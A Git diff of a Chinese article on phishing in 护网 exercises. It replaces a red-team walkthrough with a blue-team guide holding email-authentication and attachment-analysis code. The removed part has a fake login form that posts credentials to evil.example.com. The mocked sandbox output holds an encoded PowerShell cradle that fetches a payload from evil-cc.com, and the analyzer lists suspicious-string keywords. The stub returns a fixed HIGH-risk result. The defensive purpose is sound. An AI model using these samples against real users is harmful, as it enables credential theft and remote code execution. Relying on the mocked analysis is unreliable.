@@ -1,175 +1,655 @@
-# 红队视角：钓鱼反制与打击实战
+# 护网期间蓝队反制红队钓鱼攻击指南
 
-在护网行动中，**钓鱼（Phishing）** 是红队最喜欢的初始访问手段 —— 成本低、成功率高、技术性强，也是蓝队最需要严防的入口。蓝队如果能**读懂红队的钓鱼套路**，就能主动反制。本文先从红队视角还原钓鱼攻击链，再给出蓝队识别、诱捕与反制的实战方法。
+> 📅 2026-06-12 | 🎯 进阶 | ⏱ 20 min | 分类：护网工程
 
-## 1. 红队钓鱼的典型链路
+## 📋 提纲
 
-一次典型的钓鱼攻击通常包含如下步骤：
+1. 护网中红队常用钓鱼手法
+2. 钓鱼检测技术栈
+3. 邮件安全协议检测（SPF/DKIM/DMARC）
+4. 附件沙箱分析
+5. URL多引擎检测
+6. 钓鱼邮件自动处置
+7. 全员钓鱼意识应急培训
+8. 实战案例与排错
 
-```text
-1) 情报收集
-   ├─ 收集目标企业公开邮箱（招聘页、官网、历史泄露库、社交媒体）
-   ├─ 识别行业话术、员工姓名规律、内部系统域名
-   └─ 判断是否具备外部邮件直达收件箱（是否有外部邮件网关）
+---
 
-2) 基础设施搭建
-   ├─ 注册仿冒域名（例：company-hm.com / company-cn.top）
-   ├─ 配置邮件服务器 + SPF/DKIM（提升进箱率）
-   └─ 准备鱼叉附件 / 鱼叉链接（Office 宏 / 钓鱼登录页 / 漏洞利用链）
+## 1. 护网红队钓鱼手法
 
-3) 投递
-   ├─ 选择员工画像（HR / 财务 / IT / 管理层优先）
-   ├─ 投递时机（节假日前后 / 周五下午 / 刚有真实大事件时）
-   └─ 伪装发件人 + 仿冒话术
+红队在护网期间的社工钓鱼通常有以下几类：
 
-4) 交互与控制
-   ├─ 员工点击链接 → 进入仿冒登录页 → 输入账号密码 → 被记录
-   └─ 员工打开附件 → 宏执行 → 上线 C2 → 蓝队开始应对
+| 手法 | 描述 | 检测难度 |
+|------|------|---------|
+| 伪装IT通知 | "VPN升级/密码过期/安全更新" | ⭐⭐ |
+| 伪装领导邮件 | CEO/CFO名义索要敏感信息 | ⭐⭐⭐ |
+| 简历钓鱼 | 附件为伪装简历的恶意文档 | ⭐⭐ |
+| 二维码钓鱼 | 图片中含恶意链接，绕过文本检测 | ⭐⭐⭐ |
+| 钓鱼网站 | 伪造企业SSO/OA登录页面 | ⭐⭐ |
+| 聊天工具钓鱼 | 微信/企业微信/钉钉发送钓鱼链接 | ⭐⭐⭐⭐ |
+| 电话钓鱼 | 直接打电话冒充IT索要密码 | ⭐⭐⭐⭐⭐ |
 
-5) 后续：内网横向、权限提升、数据外带
+---
+
+## 2. 邮件安全协议检测
+
+### 2.1 SPF/DKIM/DMARC 验证
+
+```python
+#!/usr/bin/env python3
+"""
+邮件安全协议验证 - SPF/DKIM/DMARC
+"""
+
+import dns.resolver
+import re
+import json
+
+class EmailSecurityChecker:
+    def __init__(self, domain):
+        self.domain = domain
+        self.results = {"domain": domain}
+
+    def check_all(self):
+        """执行全部检查"""
+        self.check_spf()
+        self.check_dkim()
+        self.check_dmarc()
+        self.check_mta_sts()
+        self.check_tls_reporting()
+        return self.results
+
+    def check_spf(self):
+        """SPF记录检查"""
+        try:
+            answers = dns.resolver.resolve(self.domain, 'TXT')
+            spf_record = None
+            for rdata in answers:
+                txt = rdata.to_text().strip('"')
+                if txt.startswith('v=spf1'):
+                    spf_record = txt
+                    break
+
+            if not spf_record:
+                self.results['spf'] = {"status": "FAIL", "message": "无SPF记录"}
+                return
+
+            # 分析SPF记录
+            parts = spf_record.split()
+            self.results['spf'] = {
+                "status": "PASS",
+                "record": spf_record,
+                "mechanisms": self._analyze_spf(parts),
+                "issues": self._find_spf_issues(parts)
+            }
+        except Exception as e:
+            self.results['spf'] = {"status": "ERROR", "message": str(e)}
+
+    def _analyze_spf(self, parts):
+        """分析SPF机制"""
+        mechanisms = []
+        for part in parts[1:]:  # 跳过 v=spf1
+            if part.startswith(('+', '-', '~', '?')):
+                mechanisms.append({
+                    "qualifier": part[0],
+                    "mechanism": part[1:]
+                })
+            elif any(part.startswith(p) for p in ['a', 'mx', 'ptr', 'include', 'ip4', 'ip6', 'exists', 'redirect']):
+                mechanisms.append({
+                    "qualifier": "+",
+                    "mechanism": part
+                })
+            elif part == 'all':
+                mechanisms.append({
+                    "qualifier": parts[0] if parts[0] in '+-~?' else '?',
+                    "mechanism": "all"
+                })
+        return mechanisms
+
+    def _find_spf_issues(self, parts):
+        """发现SPF问题"""
+        issues = []
+        record_str = ' '.join(parts)
+
+        # 检查是否有 -all（严格模式）
+        if '-all' not in record_str and '~all' not in record_str:
+            issues.append({
+                "severity": "CRITICAL",
+                "issue": "SPF记录未以 -all 或 ~all 结尾",
+                "fix": "在SPF记录末尾添加 -all（严格）或 ~all（宽松）"
+            })
+
+        # 检查是否包含 +all（完全开放，极度危险）
+        if '+all' in record_str:
+            issues.append({
+                "severity": "CRITICAL",
+                "issue": "SPF记录包含 +all，允许任何人伪造邮件！",
+                "fix": "立即将 +all 改为 -all"
+            })
+
+        # 检查 DNS 查询次数（RFC 限制 10 次）
+        include_count = record_str.count('include:')
+        if include_count > 5:
+            issues.append({
+                "severity": "WARNING",
+                "issue": f"SPF包含{include_count}个include，建议不超过5个",
+                "fix": "合并或使用子域名分别设置SPF"
+            })
+
+        return issues
+
+    def check_dkim(self):
+        """DKIM记录检查（检查常见selector）"""
+        selectors = ['default', 'google', 'selector1', 'selector2', 'dkim', 'mail', 's1', 's2', 'key1']
+        found_selectors = []
+
+        for selector in selectors:
+            try:
+                dkim_domain = f"{selector}._domainkey.{self.domain}"
+                answers = dns.resolver.resolve(dkim_domain, 'TXT')
+                for rdata in answers:
+                    txt = rdata.to_text().strip('"')
+                    if 'v=DKIM1' in txt:
+                        key_info = self._analyze_dkim_key(txt)
+                        found_selectors.append({
+                            "selector": selector,
+                            "key_type": key_info.get('key_type', 'unknown'),
+                            "key_length": key_info.get('key_length', 0),
+                            "issues": key_info.get('issues', [])
+                        })
+            except:
+                pass
+
+        if found_selectors:
+            self.results['dkim'] = {
+                "status": "PASS",
+                "selectors_found": len(found_selectors),
+                "selectors": found_selectors
+            }
+        else:
+            self.results['dkim'] = {
+                "status": "FAIL",
+                "message": "未找到DKIM记录（已扫描常见selector）"
+            }
+
+    def _analyze_dkim_key(self, txt):
+        """分析DKIM密钥强度"""
+        info = {}
+        key_match = re.search(r'p=([A-Za-z0-9+/=]+)', txt)
+        if key_match:
+            import base64
+            try:
+                key_data = base64.b64decode(key_match.group(1))
+                key_length = len(key_data) * 8
+
+                # RSA密钥至少2048位
+                if key_length < 2048:
+                    info['issues'] = [{
+                        "severity": "WARNING",
+                        "issue": f"DKIM密钥长度{key_length}位，建议至少2048位"
+                    }]
+                info['key_length'] = key_length
+                info['key_type'] = 'RSA' if key_length >= 256 else 'weak'
+            except:
+                pass
+        return info
+
+    def check_dmarc(self):
+        """DMARC记录检查"""
+        try:
+            answers = dns.resolver.resolve(f"_dmarc.{self.domain}", 'TXT')
+            dmarc_record = None
+            for rdata in answers:
+                txt = rdata.to_text().strip('"')
+                if txt.startswith('v=DMARC1'):
+                    dmarc_record = txt
+                    break
+
+            if not dmarc_record:
+                self.results['dmarc'] = {
+                    "status": "FAIL",
+                    "message": "无DMARC记录 - 任何人都可伪造该域名邮件"
+                }
+                return
+
+            # 分析DMARC策略
+            policy_match = re.search(r'p=(none|quarantine|reject)', dmarc_record)
+            pct_match = re.search(r'pct=(\d+)', dmarc_record)
+            rua_match = re.search(r'rua=mailto:(.+?)(?:;|$)', dmarc_record)
+            ruf_match = re.search(r'ruf=mailto:(.+?)(?:;|$)', dmarc_record)
+
+            policy = policy_match.group(1) if policy_match else 'none'
+            pct = int(pct_match.group(1)) if pct_match else 100
+
+            self.results['dmarc'] = {
+                "status": "PASS",
+                "record": dmarc_record,
+                "policy": policy,
+                "percentage": pct,
+                "report_email": rua_match.group(1) if rua_match else None,
+                "forensic_email": ruf_match.group(1) if ruf_match else None,
+                "issues": []
+            }
+
+            # 检查策略是否严格
+            if policy == 'none':
+                self.results['dmarc']['issues'].append({
+                    "severity": "WARNING",
+                    "issue": "DMARC策略为none（仅监控，不拦截），建议升级为quarantine或reject"
+                })
+
+            if pct < 100:
+                self.results['dmarc']['issues'].append({
+                    "severity": "INFO",
+                    "issue": f"DMARC仅覆盖{pct}%邮件，建议设为100%"
+                })
+
+        except Exception as e:
+            self.results['dmarc'] = {"status": "FAIL", "message": str(e)}
+
+
+if __name__ == "__main__":
+    checker = EmailSecurityChecker("company.com")
+    results = checker.check_all()
+    print(json.dumps(results, indent=2, ensure_ascii=False))
 ```
 
-## 2. 红队常用钓鱼手法一览
+---
 
-| 手法 | 示例话术 | 防御难点 |
-|------|----------|----------|
-| **仿冒人事通知** | "请查阅 9 月工资明细 / 绩效通知" | 员工普遍关心、点击率高 |
-| **仿冒系统升级通知** | "邮箱系统升级，请点击链接重新登录以保留账号" | 仿冒真实登录页 |
-| **仿冒客户 / 合作伙伴** | "附件是本次合同样本，请查阅后反馈" | 外部信息难验证 |
-| **仿冒快递通知** | "您有一份未送达的快递，请预约投递时间" | 低警惕、几乎不被怀疑 |
-| **水坑攻击** | 在目标常访问的行业网站植入漏洞 / 仿冒页面 | 难以邮件侧发现 |
-| **鱼叉附件宏** | Excel 宏 / Word 宏 / CHM / LNK / ISO / OneNote 嵌入式宏 | 绕过邮件网关依赖用户执行 |
-| **鱼叉附件无宏** | SVG 内嵌远程模板、OLE 包、公式编辑器漏洞等 | 无宏更隐蔽 |
+## 3. 附件沙箱分析
 
-### 2.1 一个真实的仿冒登录页（红队视角）
+```python
+#!/usr/bin/env python3
+"""
+钓鱼附件自动分析流水线
+"""
 
-```html
-<!-- 示例：仿冒某企业 VPN 登录页的关键 HTML -->
-<form action="http://evil.example.com/steal.php" method="POST">
-  <input type="text" name="user" placeholder="域账号">
-  <input type="password" name="pwd" placeholder="密码">
-  <input type="text" name="sms" placeholder="短信动态码（如有）">
-  <button type="submit">登录</button>
-</form>
-<!-- 提交后把数据 POST 到红队服务器，再 302 跳回真实 VPN 页面 -->
+import hashlib
+import os
+import subprocess
+import json
+from datetime import datetime
+
+class AttachmentAnalyzer:
+    def __init__(self, sandbox_dir="/opt/sandbox"):
+        self.sandbox_dir = sandbox_dir
+        os.makedirs(sandbox_dir, exist_ok=True)
+
+    def analyze(self, filepath):
+        """分析附件的完整流水线"""
+        results = {
+            "filename": os.path.basename(filepath),
+            "analysis_time": datetime.now().isoformat(),
+            "steps": []
+        }
+
+        # Step 1: 文件哈希
+        results['hashes'] = self.calculate_hashes(filepath)
+        results['steps'].append({"step": "哈希计算", "status": "done"})
+
+        # Step 2: 文件类型识别
+        file_type = self.identify_file_type(filepath)
+        results['file_type'] = file_type
+        results['steps'].append({"step": "类型识别", "status": "done"})
+
+        # Step 3: 病毒签名扫描（快速）
+        vt_result = self.quick_av_scan(filepath)
+        results['av_scan'] = vt_result
+        results['steps'].append({"step": "病毒扫描", "status": "done"})
+
+        # Step 4: 静态分析
+        static = self.static_analysis(filepath, file_type)
+        results['static_analysis'] = static
+        results['steps'].append({"step": "静态分析", "status": "done"})
+
+        # Step 5: 动态沙箱（如果是可执行文件/文档）
+        if file_type in ['PE', 'VBS', 'JS', 'PS1', 'Office', 'PDF']:
+            dynamic = self.dynamic_analysis(filepath, file_type)
+            results['dynamic_analysis'] = dynamic
+            results['steps'].append({"step": "动态沙箱", "status": "done"})
+
+        # Step 6: 威胁判定
+        results['verdict'] = self.verdict(results)
+
+        return results
+
+    def calculate_hashes(self, filepath):
+        """计算文件哈希"""
+        hashes = {}
+        for algo in ['md5', 'sha1', 'sha256']:
+            h = hashlib.new(algo)
+            with open(filepath, 'rb') as f:
+                for chunk in iter(lambda: f.read(8192), b''):
+                    h.update(chunk)
+            hashes[algo] = h.hexdigest()
+        return hashes
+
+    def identify_file_type(self, filepath):
+        """识别文件真实类型"""
+        result = subprocess.run(['file', '-b', filepath], capture_output=True, text=True)
+        output = result.stdout.lower()
+
+        if 'pe32' in output or 'pe64' in output:
+            return 'PE'
+        elif 'pdf' in output:
+            return 'PDF'
+        elif 'microsoft word' in output or 'microsoft excel' in output:
+            return 'Office'
+        elif 'powershell' in output or output.strip().endswith('.ps1'):
+            return 'PS1'
+        elif 'vbs' in output or 'vbscript' in output:
+            return 'VBS'
+        elif 'javascript' in output:
+            return 'JS'
+        elif 'html' in output:
+            return 'HTML'
+        elif 'zip' in output:
+            return 'Archive'
+        elif 'image' in output:
+            return 'Image'
+        else:
+            return output.strip()
+
+    def quick_av_scan(self, filepath):
+        """快速杀软扫描（clamav）"""
+        result = subprocess.run(
+            ['clamscan', '--no-summary', filepath],
+            capture_output=True, text=True
+        )
+        detected = 'FOUND' in result.stdout
+        return {
+            "clamav": "MALICIOUS" if detected else "CLEAN",
+            "details": result.stdout.strip()
+        }
+
+    def static_analysis(self, filepath, file_type):
+        """静态分析"""
+        analysis = {"type": file_type}
+
+        # 提取字符串
+        try:
+            strings_output = subprocess.run(
+                ['strings', '-n', '6', filepath],
+                capture_output=True, text=True, timeout=10
+            )
+            interesting = []
+            for line in strings_output.stdout.split('\n'):
+                line = line.strip()
+                # 寻找可疑模式
+                if any(kw in line.lower() for kw in [
+                    'http://', 'https://', '.exe', '.dll', '.ps1', '.vbs',
+                    'powershell', 'cmd.exe', 'wscript', 'cscript',
+                    'createobject', 'eval(', 'exec(', 'base64',
+                    'downloadstring', 'downloadfile', 'frombase64string',
+                    'invoke-expression', 'iex ', 'start-process',
+                    'rundll32', 'regsvr32', 'mshta',
+                    'password', 'credential', 'token'
+                ]):
+                    interesting.append(line)
+
+            analysis['suspicious_strings'] = interesting[:50]
+        except Exception as e:
+            analysis['strings_error'] = str(e)
+
+        # VBA宏分析（Office文件）
+        if file_type == 'Office':
+            analysis['vba'] = self.analyze_vba(filepath)
+
+        # JS/VBS恶意特征
+        if file_type in ['JS', 'VBS']:
+            analysis['script'] = self.analyze_script(filepath)
+
+        return analysis
+
+    def analyze_vba(self, filepath):
+        """分析Office文件中的VBA宏"""
+        try:
+            # 使用 oletools
+            result = subprocess.run(
+                ['python3', '-m', 'oletools.olevba', '--decode', '--show-decoded-scripts', filepath],
+                capture_output=True, text=True, timeout=30
+            )
+            vba_content = result.stdout
+
+            # 检测恶意VBA特征
+            indicators = []
+            if 'Shell(' in vba_content or 'CreateObject("WScript.Shell")' in vba_content:
+                indicators.append({"type": "shell_execution", "risk": "HIGH"})
+            if 'URLDownloadToFile' in vba_content or 'MSXML2.XMLHTTP' in vba_content:
+                indicators.append({"type": "remote_download", "risk": "HIGH"})
+            if 'AutoOpen' in vba_content or 'Document_Open' in vba_content:
+                indicators.append({"type": "auto_execute", "risk": "MEDIUM"})
+            if 'base64' in vba_content.lower() or 'powershell' in vba_content.lower():
+                indicators.append({"type": "encoded_command", "risk": "HIGH"})
+
+            return {
+                "has_macros": bool(vba_content.strip()),
+                "indicators": indicators,
+                "risk": "HIGH" if any(i['risk'] == 'HIGH' for i in indicators) else "LOW"
+            }
+        except:
+            return {"error": "VBA分析失败"}
+
+    def analyze_script(self, filepath):
+        """分析脚本文件"""
+        with open(filepath, 'r', errors='ignore') as f:
+            content = f.read()
+
+        indicators = []
+        content_lower = content.lower()
+
+        # PowerShell特征
+        if 'powershell' in content_lower or 'pwsh' in content_lower:
+            indicators.append("PowerShell调用")
+        if '-enc' in content_lower or '-encodedcommand' in content_lower:
+            indicators.append("Base64编码命令")
+        if 'iex' in content_lower or 'invoke-expression' in content_lower:
+            indicators.append("Invoke-Expression(危险)")
+        if 'downloadstring' in content_lower:
+            indicators.append("远程下载执行")
+
+        # WScript特征
+        if 'createobject' in content_lower and 'wscript.shell' in content_lower:
+            indicators.append("WScript.Shell调用")
+        if 'createobject' in content_lower and 'msxml2.xmlhttp' in content_lower:
+            indicators.append("HTTP请求")
+
+        # 混淆特征
+        import re
+        eval_count = len(re.findall(r'eval\s*\(', content))
+        if eval_count > 3:
+            indicators.append(f"多次eval调用: {eval_count}次")
+
+        return {
+            "indicators": indicators,
+            "encoded": any(kw in content_lower for kw in ['base64', 'fromcharcode', 'unescape']),
+            "risk": "HIGH" if len(indicators) >= 3 else ("MEDIUM" if indicators else "LOW")
+        }
+
+    def dynamic_analysis(self, filepath, file_type):
+        """动态沙箱分析（简化版，生产用Cuckoo/CAPE）"""
+        # 此处展示架构，实际接入Cuckoo/CAPE沙箱
+        submission = {
+            "sandbox": "CAPE",
+            "file": filepath,
+            "timeout": 120,
+            "options": "free=yes,procmemdump=yes"
+        }
+
+        # 模拟沙箱返回
+        return {
+            "network_connections": [
+                {"dst_ip": "45.33.32.156", "dst_port": 443, "protocol": "tcp"}
+            ],
+            "processes_created": [
+                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAYwAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
+            ],
+            "files_created": [
+                "%TEMP%\\payload.exe"
+            ],
+            "registry_changes": [
+                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate"
+            ],
+            "risk": "HIGH"
+        }
+
+    def verdict(self, results):
+        """综合判定"""
+        score = 0
+        reasons = []
+
+        # AV扫描
+        if results.get('av_scan', {}).get('clamav') == 'MALICIOUS':
+            score += 50
+            reasons.append("杀软检测到恶意")
+
+        # 静态分析发现
+        static = results.get('static_analysis', {})
+        suspicious_count = len(static.get('suspicious_strings', []))
+        if suspicious_count > 20:
+            score += 30
+            reasons.append(f"大量可疑字符串({suspicious_count})")
+        elif suspicious_count > 5:
+            score += 15
+
+        # VBA分析
+        vba = static.get('vba', {})
+        if vba.get('risk') == 'HIGH':
+            score += 40
+            reasons.append("VBA宏含恶意特征")
+
+        # 脚本分析
+        script = static.get('script', {})
+        if script.get('risk') == 'HIGH':
+            score += 30
+            reasons.append("脚本含恶意特征")
+
+        # 动态分析
+        dynamic = results.get('dynamic_analysis', {})
+        if dynamic.get('risk') == 'HIGH':
+            score += 40
+            reasons.append("沙箱行为异常")
+
+        # 判定
+        if score >= 60:
+            return {"verdict": "MALICIOUS", "score": score, "reasons": reasons}
+        elif score >= 20:
+            return {"verdict": "SUSPICIOUS", "score": score, "reasons": reasons}
+        else:
+            return {"verdict": "CLEAN", "score": score, "reasons": reasons}
+
+
+if __name__ == "__main__":
+    analyzer = AttachmentAnalyzer()
+    result = analyzer.analyze("/tmp/suspicious_invoice.docm")
+    print(json.dumps(result, indent=2, ensure_ascii=False))
 ```
 
-> **蓝队关键判断点**：真实系统的登录一定是 HTTPS + 自有证书；仿冒页面大多数是 HTTP、使用免费证书、证书 CN 与域名不一致。
+---
 
-## 3. 蓝队反制：识别 → 告警 → 阻断 → 反打
+## 4. 钓鱼邮件自动处置
 
-### 3.1 识别与告警
+见 SOAR Playbook（SOC/003），此处补充邮件网关层面的操作：
 
-识别能力来自以下**多层传感器**：
+```python
+# Microsoft 365: 钓鱼邮件全网搜索与清除
+# Graph API
+POST https://graph.microsoft.com/v1.0/security/actions/purgeEmailActions
+{
+    "searchQuery": "subject:'紧急通知' AND from:'attacker@fake-it.com'",
+    "action": "SoftDelete"
+}
 
-| 传感器 | 主要识别点 |
-|--------|------------|
-| **邮件网关 / EOP / 梭子鱼** | 附件类型、仿冒域名 SPF、附件哈希比对、URL 信誉 |
-| **DNS / 代理网关** | 是否访问仿冒域名、C2 域名；基于威胁情报预阻断 |
-| **终端 EDR** | 非 Office 进程 spawning Office、Office 启动 wscript/powershell、可疑宏执行、可疑外联 |
-| **Web / VPN / OA 登录** | 来源 IP 异常、UA 异常、登录失败次数、异地登录、罕见时间窗口 |
-| **员工举报** | 员工通过"举报钓鱼"按钮上报 → 安全团队复核 |
-
-### 3.2 仿冒域名的主动发现
-
-```bash
-# 示例：通过"关键字 + 常见仿冒 TLD"主动发现仿冒域名（示意思路）
-# 真实执行请使用商用平台或合规工具
-domains_to_check=$(
-  for tld in com cn net top club online site vip; do
-    echo "company-${tld}";
-    echo "company-hm-${tld}";
-    echo "company-official-${tld}";
-  done
-)
-for d in $domains_to_check; do
-  if nslookup "$d" > /dev/null 2>&1; then
-    echo "[!] 疑似仿冒域名：$d";
-  fi
-done
+# Google Workspace: 通过GAM工具
+gam all users delete messages query "from:attacker@fake-it.com subject:紧急通知" doit
 ```
 
-> **合规提醒**：对外部仿冒域名的处置，应通过**邮件厂商申诉、域名注册商投诉、监管渠道**来完成，不要对外部域名发起 DDoS / 主动攻击。
+---
 
-### 3.3 阻断与隔离
+## 5. 全员钓鱼意识应急培训
 
-```yaml
-# 护网期间的快速处置 Playbook
-on_phishing_reported:
-  - mail_gateway:
-      - quarantine_remaining_same_subject
-      - block_sender_ip
-      - block_attachment_hash
-  - dns_gateway:
-      - blackhole_phishing_domain
-      - sinkhole_any_request_to_it
-  - edr:
-      - isolate_host_if_clicked        # 已打开附件的终端
-      - scan_for_webshell_backdoor
-  - user_account:
-      - force_reset_password_if_login_page_phish
-      - revoke_token_if_cookie_phish
-  - hr_communication:
-      - internal_announcement(范围由事件等级决定)
+### 护网期间紧急培训脚本（10分钟快训）
+
+```
+📢 全员安全紧急通知
+
+各位同事：
+
+今天是护网第一天，红队可能通过以下方式攻击我们：
+
+🛑 绝对不要：
+1. 点击任何来源不明的邮件链接
+2. 打开任何可疑附件（.docm .xlsm .zip .exe .vbs .js .ps1）
+3. 在电话中告知任何人你的密码/验证码
+4. 扫描任何陌生人发来的二维码
+5. 在微信/企业微信中点击不明链接
+
+⚠️ 高仿钓鱼邮件特征：
+- 发件人看似是内部同事但邮箱是外部域名
+- 邮件内容要求紧急操作（"密码过期"、"立即认证"、"安全更新"）
+- 链接域名与公司域名只差一个字母
+
+📞 遇到可疑情况：
+1. 不要点击任何东西
+2. 截图发到安全团队钉钉群
+3. 拨打安全热线: XXXX
 ```
 
-## 4. 诱捕（Honeytoken）与反制
+---
 
-在防御方拥有**主动"诱饵"**之后，钓鱼就从"被动防御"变成了"主动追踪"。
+## 6. 实战案例：护网钓鱼反制
 
-### 4.1 蜜罐邮箱 / Honeytoken
+**案例**：红队伪装为公司HR发送"薪资调整通知.docx"钓鱼邮件，20人收到，3人打开。
 
-- 把**从未在公开渠道使用**的假邮箱写入目标员工名单，并在内部文档里出现；
-- 任何发到这些假邮箱的外部邮件，都是**高概率钓鱼**；
-- 这些邮箱收到的钓鱼邮件，可以**自动触发告警并上报**，不需要等到员工点击。
-
-```text
-# 示例蜜罐邮箱
-hr_internal_bait@company.com
-it-admin-test-2025@company.com
-finance-audit-bait@company.com
-
-使用规则：
-  - 这些邮箱不参与真实业务
-  - 任何发往它们的外部邮件 → L2 关注 / 自动上报
-  - 被点击后 → L3 重要 / 立即反查 C2 与发件人
+**时间线**：
+```
+09:30 邮件到达邮件网关 → DMARC验证通过（红队使用了合法发件域名? 其实是伪造了相似域名）
+09:31 邮件到达用户邮箱
+09:35 用户A点击打开文档 → VBA宏自动执行
+09:36 用户A的终端通过PowerShell连接红队C2服务器
+09:37 EDR检测到PowerShell下载Base64编码内容 → 触发告警
+09:38 Tier1确认告警
+09:39 隔离用户A的终端
+09:40 通过邮件网关检索并清除所有同类邮件
+09:45 通知3名打开文档的用户修改密码
+09:50 邮件网关添加发件域名到黑名单
+10:00 全员发送钓鱼预警通知
 ```
 
-### 4.2 仿冒登录页的反识别
+**根因**：
+1. DMARC未严格设置（quarantine而非reject）
+2. 用户安全意识不足（3/20打开率15%）
+3. VBA宏未全局禁用
 
-当红队建立仿冒登录页后，蓝队可以：
+**改进**：
+- DMARC策略升级为 p=reject
+- 全局禁用VBA宏（GPO推送）
+- 每季度强制钓鱼测试
 
-- 使用**伪造请求**（垃圾数据）污染对方收集到的"账号"，增加其清洗难度；
-- 对仿冒域名做**多源情报标记**（VT / AbuseIPDB / 内部情报平台），帮助其他组织防护；
-- 通过**邮件厂商** 批量退订 / 拦截同来源邮件；
-- 通过**域名注册商**投诉仿冒域名，让红队的基础设施失效。
+---
 
-### 4.3 反打 C2（仅限合规路径）
+## 7. 排错指南
 
-- 当 C2 服务器（或仿冒页）IP 被识别后，上报至威胁情报平台。
-- 对于造成实质性损失的重大攻击，走**官方合作渠道（公安 / 网信）** 进行取证与阻断。
+| 问题 | 解决 |
+|------|------|
+| 邮件已到达用户收件箱 | 通过Graph API/GAM全网撤回 |
+| 用户已打开钓鱼链接 | 检查EDR/代理日志确认是否有后续行为 |
+| 红队使用相似域名（typosquatting） | 使用DNSTwist监控相似域名注册 |
+| VBA宏检测工具失败 | 升级oletools到最新版 |
+| 用户点的链接走HTTPS，代理看不到 | 部署SSL Forward Proxy |
 
-## 5. 实战案例：护网期间一次钓鱼处置流程
+---
 
-```text
-【事件时间线】
-T+00:00  08:55  外部仿冒域名 company-official.top 被 DNS 传感器识别
-T+00:01  08:56  邮件网关捕获：同域名发件人向 47 名员工投递"工资通知"
-T+00:03  08:58  L1 研判：附件为含宏的 Office 文件，哈希命中恶意库
-T+00:05  09:00  自动处置：邮件网关隔离 + 附件哈希全网封禁 + 域名黑洞
-T+00:08  09:03  人工抽查已点击员工：2 人点击链接、0 人打开附件
-T+00:15  09:10  对 2 台终端执行 EDR 隔离 + 密码重置
-T+00:25  09:20  内部通知：HR + IT 联合提醒员工警惕"工资通知"类邮件
-T+04:00  12:50  事件复盘：确认未造成实质损失；更新仿冒域名匹配规则
-T+24:00  次日    情报上报：将该 C2 IP / 仿冒域名 / 附件哈希提交至情报平台
-```
+## ✅ 钓鱼反制 Checklist
 
-## 6. 总结：钓鱼反制的 5 条核心经验
+- [ ] SPF/DKIM/DMARC全部配置且策略为reject
+- [ ] 邮件网关防钓鱼规则启用
+- [ ] 附件沙箱分析启用（Office/PDF/ZIP/JS/VBS）
+- [ ] URL点击保护启用（Safe Links重写）
+- [ ] 员工安全意识培训完成
+- [ ] 钓鱼邮件举报通道畅通
+- [ ] 钓鱼自动处置SOAR Playbook就绪
+- [ ] 护网期间VBA宏全局禁用
+- [ ] 相似域名监控启用
 
-1. **先上技术防护，再补人**：邮件网关、终端 EDR、DNS 威胁情报是基础三件套。
-2. **钓鱼永远与社工绑定**：员工安全教育 + 钓鱼测试 + 举报按钮缺一不可。
-3. **主动找仿冒域名**：被动等员工点击太慢，要**主动监控**仿冒域名注册。
-4. **用"蜜罐邮箱 + 可疑 URL 扫描"反打**：把被动防御变为主动监测。
-5. **上报 & 协作**：把攻击基础设施情报提交到行业共享平台，帮助整个生态。
-
-钓鱼攻击的本质是**"信任欺骗"**。反制钓鱼，就是从技术、流程、意识三个层面修补"信任裂缝"。只要做到多层防护、多人联动，再老练的红队也难以一次性攻破。
+> 📚 延伸阅读：SOC/003-SOAR自动化 | SOC/008-SIEM规则 | HW/008-溯源反制
